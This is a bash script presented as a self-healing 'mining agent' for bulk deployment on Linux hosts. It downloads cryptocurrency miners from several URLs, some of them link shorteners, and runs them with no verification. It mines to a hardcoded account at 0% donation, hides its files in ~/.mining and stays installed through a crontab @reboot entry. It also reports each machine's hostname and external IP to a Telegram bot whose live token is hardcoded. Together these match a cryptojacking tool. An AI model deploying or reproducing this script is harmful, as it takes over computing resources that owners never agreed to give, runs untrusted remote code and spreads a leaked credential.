#!/bin/bash
# MINING AGENT v3.2 — SELF-HEALING | Auto-Reinstall on Repeated Failures
# Maximum fault tolerance for bulk deployment on any Linux system
# Launch: ALLOW_MINING=1 bash demo1/min1.sh
set -u

#############################################
# CONFIG (HARDCODED FOR RELIABILITY)
#############################################
ALLOW_MINING="${ALLOW_MINING:-0}"
TEST_MODE="${TEST_MODE:-0}"
INTERVAL="${INTERVAL:-60}"
MAX_LOG_SIZE="${MAX_LOG_SIZE:-5242880}"
INSTALL_RETRIES="${INSTALL_RETRIES:-5}"
DOWNLOAD_TIMEOUT="${DOWNLOAD_TIMEOUT:-45}"
MAX_RESTARTS_BEFORE_REINSTALL="${MAX_RESTARTS_BEFORE_REINSTALL:-3}"
RESTART_WINDOW_SECONDS="${RESTART_WINDOW_SECONDS:-3600}"  # 1 hour

# Kryptex Account
KRIPTEX="krxX3PVQVR"

# Pools (multiple endpoints for failover)
XMR_POOL="xmr.kryptex.network:7029"
ETC_POOL="etc.kryptex.network:7033"
RVN_POOL="rvn.kryptex.network:6013"

# Telegram (HARDCODED)
TG_TOKEN="8415540095:AAFPXWwJt7dwzyg-JLc0e5U3I5mOHzzAfb4"
TG_CHAT="5336452555"
TG_API="https://api.telegram.org/bot${TG_TOKEN}/sendMessage"

# Paths (user-space, no sudo needed)
BASE="${HOME}/.mining"
BIN="$BASE/bin"
RUN="$BASE/run"
LOG="$BASE/log"
PID_CPU="$RUN/cpu.pid"
PID_GPU="$RUN/gpu.pid"
STATE_CPU="$RUN/cpu.state"
STATE_GPU="$RUN/gpu.state"

#############################################
# LOGGING
#############################################

log() {
  _msg="[$(date '+%F %T')] $*"
  echo "$_msg" >> "$LOG/agent.log" 2>/dev/null || echo "$_msg"
}

#############################################
# TELEGRAM (SINGLE MESSAGE ONLY)
#############################################

tg() {
  _text="$1"
  _priority="${2:-info}"
  
  # ONLY send on: success, error, reinstall (NOT on warnings/restarts)
  case "$_priority" in
    success|error|reinstall) ;;
    *) return 0 ;;
  esac
  
  # Try multiple HTTP clients
  if command -v curl >/dev/null 2>&1; then
    curl -s --connect-timeout 10 -m 20 -X POST "$TG_API" \
      -d chat_id="$TG_CHAT" \
      --data-urlencode text="$_text" >/dev/null 2>&1 || true
  elif command -v wget >/dev/null 2>&1; then
    wget -q --timeout=10 -O- --post-data="chat_id=$TG_CHAT&text=$(printf '%s' "$_text" | sed 's/&/%26/g')" \
      "$TG_API" >/dev/null 2>&1 || true
  fi
}

#############################################
# HTTP CLIENT (AUTO-DETECT + FALLBACK)
#############################################

http_get() {
  _url="$1"
  _timeout="${2:-$DOWNLOAD_TIMEOUT}"
  
  if command -v curl >/dev/null 2>&1; then
    curl -sL --connect-timeout 10 -m "$_timeout" -A "MiningAgent/3.2" \
      --retry 2 --retry-delay 3 "$_url" 2>/dev/null
  elif command -v wget >/dev/null 2>&1; then
    wget -qO- --timeout="$_timeout" --user-agent="MiningAgent/3.2" \
      --tries=2 "$_url" 2>/dev/null
  elif command -v busybox >/dev/null 2>&1; then
    busybox wget -qO- -T "$_timeout" "$_url" 2>/dev/null
  else
    return 1
  fi
}

download_file() {
  _out="$1"
  _url="$2"
  _timeout="${3:-$DOWNLOAD_TIMEOUT}"
  
  if command -v curl >/dev/null 2>&1; then
    curl -sL --connect-timeout 10 -m "$_timeout" -A "MiningAgent/3.2" \
      --retry 2 --retry-delay 3 -o "$_out" "$_url" 2>/dev/null
  elif command -v wget >/dev/null 2>&1; then
    wget -q --timeout="$_timeout" --user-agent="MiningAgent/3.2" \
      --tries=2 -O "$_out" "$_url" 2>/dev/null
  elif command -v busybox >/dev/null 2>&1; then
    busybox wget -T "$_timeout" -O "$_out" "$_url" 2>/dev/null
  else
    return 1
  fi
  
  [ -s "$_out" ] && return 0 || return 1
}

#############################################
# SYSTEM DETECTION
#############################################

get_arch() {
  _arch=$(uname -m 2>/dev/null || echo "x86_64")
  case "$_arch" in
    x86_64|x64|amd64) echo "x64" ;;
    aarch64|arm64) echo "arm64" ;;
    armv7l|armhf) echo "arm" ;;
    *) echo "x64" ;;
  esac
}

get_os() {
  if [ -f /etc/os-release ]; then
    . /etc/os-release
    echo "$ID" | tr '[:upper:]' '[:lower:]'
  elif [ -f /etc/alpine-release ]; then
    echo "alpine"
  elif [ -f /etc/centos-release ]; then
    echo "centos"
  else
    echo "unknown"
  fi
}

check_disk_space() {
  _required_mb="${1:-100}"
  _available=$(df -m "$BASE" 2>/dev/null | tail -1 | awk '{print $4}')
  [ "${_available:-0}" -ge "$_required_mb" ] && return 0 || return 1
}

#############################################
# EXTERNAL IP (6-SOURCE FALLBACK)
#############################################

get_external_ip() {
  for _src in \
    "https://api.ipify.org" \
    "https://ifconfig.me/ip" \
    "https://icanhazip.com" \
    "https://ident.me" \
    "https://ipinfo.io/ip" \
    "https://api.ip.sb/ip"
  do
    _ip=$(http_get "$_src" 15 2>/dev/null | tr -d '[:space:]' | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' | head -1)
    [ -n "$_ip" ] && [ "$_ip" != "127.0.0.1" ] && echo "$_ip" && return 0
  done
  
  # Fallback: try to get non-local IP from routing
  _ip=$(ip route get 1.1.1.1 2>/dev/null | grep -oE 'src [0-9.]+' | awk '{print $2}' | head -1)
  [ -n "$_ip" ] && echo "$_ip" && return 0
  
  echo "0.0.0.0"
}

get_node_id() {
  if [ "$TEST_MODE" = "1" ]; then
    echo "TEST"
  else
    hostname 2>/dev/null || echo "UNKNOWN"
  fi
}

#############################################
# PROCESS MANAGEMENT (MULTI-METHOD)
#############################################

is_alive() {
  _pidfile="$1"
  _name="$2"
  
  # Method 1: PID file
  if [ -f "$_pidfile" ]; then
    _pid=$(cat "$_pidfile" 2>/dev/null)
    [ -n "$_pid" ] && kill -0 "$_pid" 2>/dev/null && return 0
  fi
  
  # Method 2: pgrep
  pgrep -f "$_name" >/dev/null 2>&1 && return 0
  
  # Method 3: ps + grep
  ps aux 2>/dev/null | grep -v grep | grep -q "$_name" && return 0
  
  return 1
}

kill_miner() {
  _name="$1"
  pkill -f "$_name" 2>/dev/null || true
  killall "$_name" 2>/dev/null || true
  sleep 1
}

#############################################
# RESTART TRACKING (FOR AUTO-REINSTALL)
#############################################

# State file format: COUNT|LAST_TIMESTAMP
init_state() {
  _statefile="$1"
  if [ ! -f "$_statefile" ]; then
    echo "0|0" > "$_statefile"
  fi
}

get_restart_count() {
  _statefile="$1"
  [ -f "$_statefile" ] && cut -d'|' -f1 "$_statefile" || echo "0"
}

get_last_restart() {
  _statefile="$1"
  [ -f "$_statefile" ] && cut -d'|' -f2 "$_statefile" || echo "0"
}

update_restart_state() {
  _statefile="$1"
  _now=$(date +%s)
  _last=$(get_last_restart "$_statefile")
  _count=$(get_restart_count "$_statefile")
  
  # Reset counter if outside window
  if [ $((_now - _last)) -gt "$RESTART_WINDOW_SECONDS" ]; then
    _count=0
  fi
  
  _count=$((_count + 1))
  echo "${_count}|${_now}" > "$_statefile"
  echo "$_count"
}

reset_restart_state() {
  _statefile="$1"
  echo "0|0" > "$_statefile"
}

should_reinstall() {
  _statefile="$1"
  _count=$(update_restart_state "$_statefile")
  [ "$_count" -ge "$MAX_RESTARTS_BEFORE_REINSTALL" ] && return 0 || return 1
}

#############################################
# INSTALLERS (5 MIRRORS + 5 RETRIES)
#############################################

install_xmrig() {
  log "📦 Installing XMRig (attempt 1 of $INSTALL_RETRIES)..."
  kill_miner "xmrig"
  rm -f "$BIN/cpu/xmrig" 2>/dev/null
  rm -rf "$BIN/cpu/xmrig"* 2>/dev/null
  
  _arch=$(get_arch)
  _mirrors="
    https://xmrig.com/download/xmrig-6.25.0-linux-static-${_arch}.tar.gz
    https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-${_arch}.tar.gz
    https://gitlab.com/xmrig/xmrig/-/releases/v6.25.0/downloads/xmrig-6.25.0-linux-static-${_arch}.tar.gz
    https://mirror.xmrig.com/xmrig-6.25.0-linux-static-${_arch}.tar.gz
    https://cdn.xmrig.com/xmrig-6.25.0-linux-static-${_arch}.tar.gz
  "
  
  _attempt=1
  while [ $_attempt -le "$INSTALL_RETRIES" ]; do
    for _url in $_mirrors; do
      log "   Download attempt $_attempt: $_url"
      if download_file "/tmp/xmrig.tgz" "$_url" 45; then
        mkdir -p "$BIN/cpu" 2>/dev/null
        if tar -xzf /tmp/xmrig.tgz -C "$BIN/cpu" --strip-components=1 2>/dev/null; then
          chmod +x "$BIN/cpu/xmrig" 2>/dev/null
          if [ -x "$BIN/cpu/xmrig" ] && "$BIN/cpu/xmrig" --version >/dev/null 2>&1; then
            log "✅ XMRig installed successfully"
            rm -f /tmp/xmrig.tgz 2>/dev/null
            return 0
          fi
        fi
      fi
      rm -f /tmp/xmrig.tgz 2>/dev/null
    done
    _attempt=$((_attempt + 1))
    [ $_attempt -le "$INSTALL_RETRIES" ] && sleep 3
  done
  
  log "❌ XMRig installation failed after $_attempt attempts"
  return 1
}

install_lolminer() {
  log "📦 Installing lolMiner (attempt 1 of $INSTALL_RETRIES)..."
  kill_miner "lolMiner"
  rm -f "$BIN/gpu/lolMiner" 2>/dev/null
  rm -rf "$BIN/gpu/lolMiner"* 2>/dev/null
  
  _mirrors="
    https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz
    https://www.lorexxar.ch/lolminer/lolMiner_v1.98a_Lin64.tar.gz
    https://bit.ly/lolminer198a
    https://tinyurl.com/lolminer198
    https://github.com/Lolliedieb/lolMiner-releases/releases/latest/download/lolMiner_v1.98a_Lin64.tar.gz
  "
  
  _attempt=1
  while [ $_attempt -le "$INSTALL_RETRIES" ]; do
    for _url in $_mirrors; do
      log "   Download attempt $_attempt: $_url"
      if download_file "/tmp/lolminer.tgz" "$_url" 45; then
        mkdir -p "$BIN/gpu" 2>/dev/null
        if tar -xzf /tmp/lolminer.tgz -C "$BIN/gpu" --strip-components=1 2>/dev/null; then
          chmod +x "$BIN/gpu/lolMiner" 2>/dev/null
          if [ -x "$BIN/gpu/lolMiner" ] && "$BIN/gpu/lolMiner" --version >/dev/null 2>&1; then
            log "✅ lolMiner installed successfully"
            rm -f /tmp/lolminer.tgz 2>/dev/null
            return 0
          fi
        fi
      fi
      rm -f /tmp/lolminer.tgz 2>/dev/null
    done
    _attempt=$((_attempt + 1))
    [ $_attempt -le "$INSTALL_RETRIES" ] && sleep 3
  done
  
  log "❌ lolMiner installation failed after $_attempt attempts"
  return 1
}

install_miniz() {
  # FALLBACK miner for Zcash/EquiHash if lolMiner fails
  log "📦 Installing miniZ (fallback)..."
  kill_miner "miniz"
  rm -f "$BIN/gpu/miniz" 2>/dev/null
  
  _mirrors="
    https://github.com/miniz-mining/miniz/releases/download/v3.2pl1/miniz-3.2pl1-x64-linux.tar.gz
    https://miniz.ch/download/miniz-3.2pl1-x64-linux.tar.gz
  "
  
  for _url in $_mirrors; do
    if download_file "/tmp/miniz.tar.gz" "$_url" 45; then
      mkdir -p "$BIN/gpu" 2>/dev/null
      if tar -xzf /tmp/miniz.tar.gz -C "$BIN/gpu" 2>/dev/null; then
        chmod +x "$BIN/gpu/miniz" 2>/dev/null
        [ -x "$BIN/gpu/miniz" ] && return 0
      fi
    fi
    rm -f /tmp/miniz.tar.gz 2>/dev/null
  done
  
  return 1
}

#############################################
# STARTERS (WITH RETRY)
#############################################

start_cpu() {
  log "🚀 Starting XMRig..."
  is_alive "$PID_CPU" "xmrig" && return 0
  
  rotate_log "$LOG/cpu.log"
  
  _retry=1
  while [ $_retry -le 3 ]; do
    "$BIN/cpu/xmrig" \
      -o "$XMR_POOL" \
      -u "$KRIPTEX.$(get_node_id)" -p x \
      --algo randomx \
      --http-enabled --http-host 127.0.0.1 --http-port 16000 \
      --cpu-max-threads-hint=90 \
      --no-cpu-affinity \
      --donate-level 0 \
      --tls 2>/dev/null >> "$LOG/cpu.log" 2>&1 &
    echo $! > "$PID_CPU"
    sleep 4
    
    if is_alive "$PID_CPU" "xmrig"; then
      log "✅ CPU miner started (pid:$(cat $PID_CPU 2>/dev/null))"
      return 0
    fi
    
    log "⚠️ CPU start attempt $_retry failed, retrying..."
    _retry=$((_retry + 1))
    sleep 2
  done
  
  log "❌ CPU miner failed to start after 3 attempts"
  return 1
}

start_gpu() {
  log "🚀 Starting lolMiner..."
  is_alive "$PID_GPU" "lolMiner" && return 0
  
  rotate_log "$LOG/gpu.log"
  
  _retry=1
  while [ $_retry -le 3 ]; do
    "$BIN/gpu/lolMiner" \
      --algo ETCHASH \
      --pool "$ETC_POOL" \
      --user "$KRIPTEX.$(get_node_id)" \
      --ethstratum ETCPROXY \
      --apihost 127.0.0.1 --apiport 8080 \
      --watchdog exit \
      --tls on 2>/dev/null >> "$LOG/gpu.log" 2>&1 &
    echo $! > "$PID_GPU"
    sleep 6
    
    if is_alive "$PID_GPU" "lolMiner"; then
      log "✅ GPU miner started (pid:$(cat $PID_GPU 2>/dev/null))"
      return 0
    fi
    
    log "⚠️ GPU start attempt $_retry failed, retrying..."
    _retry=$((_retry + 1))
    sleep 3
  done
  
  log "❌ GPU miner failed to start after 3 attempts"
  return 1
}

#############################################
# LOG ROTATION
#############################################

rotate_log() {
  _f="$1"
  [ -f "$_f" ] || return
  _sz=$(stat -c%s "$_f" 2>/dev/null || stat -f%z "$_f" 2>/dev/null || echo 0)
  [ "$_sz" -gt "$MAX_LOG_SIZE" ] && tail -n 1000 "$_f" > "${_f}.tmp" && mv "${_f}.tmp" "$_f"
}

#############################################
# AUTOSTART
#############################################

ensure_autostart() {
  _script_path="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"
  _entry="@reboot ALLOW_MINING=1 bash $_script_path"
  _current=$(crontab -l 2>/dev/null || echo "")
  echo "$_current" | grep -qF "$_script_path" && return 0
  (echo "$_current"; echo "$_entry") | crontab - 2>/dev/null || true
  log "✅ Autostart configured: $_entry"
}

#############################################
# RECOVERY WITH REINSTALL LOGIC
#############################################

recover_cpu() {
  log "🔄 CPU miner dead, attempting recovery..."
  
  if should_reinstall "$STATE_CPU"; then
    log "⚠️ CPU miner crashed $MAX_RESTARTS_BEFORE_REINSTALL times in $RESTART_WINDOW_SECONDS seconds"
    log "📦 Triggering REINSTALL of XMRig..."
    tg "⚠️ [$NODE_ID | $EXT_IP] CPU miner unstable — REINSTALLING" "reinstall"
    reset_restart_state "$STATE_CPU"
    install_xmrig && start_cpu || log "❌ CPU reinstall failed"
  else
    _count=$(get_restart_count "$STATE_CPU")
    log "🔄 Restarting CPU miner (crash #$(($_count + 1)) this hour)"
    start_cpu || true
  fi
}

recover_gpu() {
  log "🔄 GPU miner dead, attempting recovery..."
  
  if should_reinstall "$STATE_GPU"; then
    log "⚠️ GPU miner crashed $MAX_RESTARTS_BEFORE_REINSTALL times in $RESTART_WINDOW_SECONDS seconds"
    log "📦 Triggering REINSTALL of lolMiner..."
    tg "⚠️ [$NODE_ID | $EXT_IP] GPU miner unstable — REINSTALLING" "reinstall"
    reset_restart_state "$STATE_GPU"
    install_lolminer && start_gpu || {
      log "⚠️ lolMiner reinstall failed, trying miniZ..."
      install_miniz && start_gpu || log "❌ GPU reinstall failed"
    }
  else
    _count=$(get_restart_count "$STATE_GPU")
    log "🔄 Restarting GPU miner (crash #$(($_count + 1)) this hour)"
    start_gpu || true
  fi
}

#############################################
# MAIN
#############################################

main() {
  [ "$ALLOW_MINING" = "1" ] || exit 0
  
  # Create directories (retry if fails)
  _mkdir_retry=1
  while [ $_mkdir_retry -le 3 ]; do
    mkdir -p "$BIN/cpu" "$BIN/gpu" "$RUN" "$LOG" 2>/dev/null && break
    _mkdir_retry=$((_mkdir_retry + 1))
    sleep 1
  done
  
  # Ensure log directory exists
  touch "$LOG/agent.log" 2>/dev/null || true
  
  log "=========================================="
  log "🚀 MINING AGENT v3.2 STARTING"
  log "=========================================="
  log "Launch command: ALLOW_MINING=1 bash demo1/min1.sh"
  
  # Resolve identifiers ONCE
  NODE_ID=$(get_node_id)
  EXT_IP=$(get_external_ip)
  _arch=$(get_arch)
  _os=$(get_os)
  
  log "Node: $NODE_ID | IP: $EXT_IP | Arch: $_arch | OS: $_os"
  
  # Initialize state files for restart tracking
  init_state "$STATE_CPU"
  init_state "$STATE_GPU"
  
  # Check disk space
  if ! check_disk_space 200; then
    log "❌ Insufficient disk space"
    tg "❌ [$NODE_ID | $EXT_IP] FAILED: No disk space" "error"
    exit 1
  fi
  
  # Install miners (with retries)
  _cpu_ok=0
  _gpu_ok=0
  
  if [ ! -x "$BIN/cpu/xmrig" ]; then
    install_xmrig && _cpu_ok=1 || log "⚠️ XMRig not available"
  else
    _cpu_ok=1
    log "✅ XMRig already installed"
  fi
  
  if [ ! -x "$BIN/gpu/lolMiner" ]; then
    install_lolminer && _gpu_ok=1 || {
      log "⚠️ lolMiner failed, trying miniZ fallback..."
      install_miniz && _gpu_ok=1 || log "⚠️ No GPU miner available"
    }
  else
    _gpu_ok=1
    log "✅ lolMiner already installed"
  fi
  
  # Setup autostart
  ensure_autostart
  
  # Start miners
  [ "$_cpu_ok" = "1" ] && start_cpu || log "⚠️ CPU miner not started"
  [ "$_gpu_ok" = "1" ] && start_gpu || log "⚠️ GPU miner not started"
  
  # Wait for miners to initialize
  sleep 10
  
  # 🎯 SINGLE TELEGRAM MESSAGE (success or fail)
  if [ "$_cpu_ok" = "1" ] || [ "$_gpu_ok" = "1" ]; then
    _status="CPU:${_cpu_ok} GPU:${_gpu_ok}"
    log "✅ Mining active: $_status"
    tg "✅ [$NODE_ID | $EXT_IP] Mining ACTIVE | $_status | Arch:$_arch" "success"
  else
    log "❌ Mining setup FAILED"
    tg "❌ [$NODE_ID | $EXT_IP] Mining FAILED | Arch:$_arch | OS:$_os" "error"
    exit 1
  fi
  
  # 🔁 SELF-HEALING WATCHDOG (NO TELEGRAM SPAM except reinstall)
  log "🔁 Entering self-healing watchdog mode..."
  while true; do
    # CPU recovery (with reinstall logic)
    if [ "$_cpu_ok" = "1" ] && ! is_alive "$PID_CPU" "xmrig"; then
      recover_cpu
    fi
    
    # GPU recovery (with reinstall logic)
    if [ "$_gpu_ok" = "1" ] && ! is_alive "$PID_GPU" "lolMiner"; then
      recover_gpu
    fi
    
    # Zero hashrate recovery (silent, then reinstall if persistent)
    if [ "$_gpu_ok" = "1" ]; then
      _hr=$(http_get "http://127.0.0.1:8080/summary" 5 2>/dev/null | grep -oE '"Performance":\s*[0-9.]+' | grep -oE '[0-9.]+' | head -1)
      if [ -n "$_hr" ] && [ "$_hr" = "0" ]; then
        sleep 20
        _hr2=$(http_get "http://127.0.0.1:8080/summary" 5 2>/dev/null | grep -oE '"Performance":\s*[0-9.]+' | grep -oE '[0-9.]+' | head -1)
        if [ "$_hr2" = "0" ]; then
          log "⚠️ GPU zero HR detected..."
          # Treat zero HR as a crash for reinstall counting
          should_reinstall "$STATE_GPU" && {
            log "📦 GPU zero HR persistent — REINSTALLING..."
            tg "⚠️ [$NODE_ID | $EXT_IP] GPU zero HR — REINSTALLING" "reinstall"
            reset_restart_state "$STATE_GPU"
            install_lolminer && start_gpu || true
          } || {
            update_restart_state "$STATE_GPU" >/dev/null
            start_gpu || true
          }
        fi
      fi
    fi
    
    # Log rotation
    rotate_log "$LOG/agent.log"
    rotate_log "$LOG/cpu.log"
    rotate_log "$LOG/gpu.log"
    
    sleep "$INTERVAL"
  done
}

# Run main
main "$@"
